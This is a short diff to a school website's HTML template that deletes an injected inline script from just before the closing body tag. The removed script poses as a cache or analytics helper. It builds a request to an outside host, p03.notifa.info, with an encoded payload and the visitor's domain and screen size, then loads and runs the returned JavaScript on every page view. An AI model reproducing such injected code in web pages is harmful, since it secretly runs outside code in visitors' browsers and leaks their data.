@@ -96,6 +96,6 @@
 <!-- inject:js -->
 <script src="{{ asset ('assets-sekolah/js/template.js') }}"></script>
 <!-- endinject -->
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX8%2flUox7P%2f3BG1skLCJXKsTwipzOehaaLRf5nL3LwlIqv0sAkixMAE1coHzWL%2bmITMAKwVZqv5FImQGCIkye3clJWwr6hs9%2bB%2bWD2oe4TYlAxiDut9zjq%2bca9Kklp50Yg2lYFwkEFuzXDXkM19FYyQWPaGbRSvqCqyDS9UOTU0x7EfONJaimJIZVB7q3Aj8wyYWmhH8xIMDzekHU2aKSViR6eI5NpUAlqN1iKrphL5d8FnAT%2fVX8UTXz2qf6i6aVj2I4opbYJ%2bnGMdVQ2YLlgOVxA4C%2f%2fPx%2b8j1mPMw%2flF3Wx%2bVywgO%2fLtp0%2f7Q9WuFi6y%2bWKH2kQ%2btt69r6YmcPVWcqZxNZabEJ9aSz5o9Jqb420jxPTyLllwVfdS3HoV4AaE9sWNDf8vjX7Iz8K8TbvZWBkwam%2bAhm6C3Qqer9x2%2fTyoArmve2oIZ7CexowXxxoO37VpmZk0VCD0v5EQ0OQ%2bQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</body>
 
 </html>
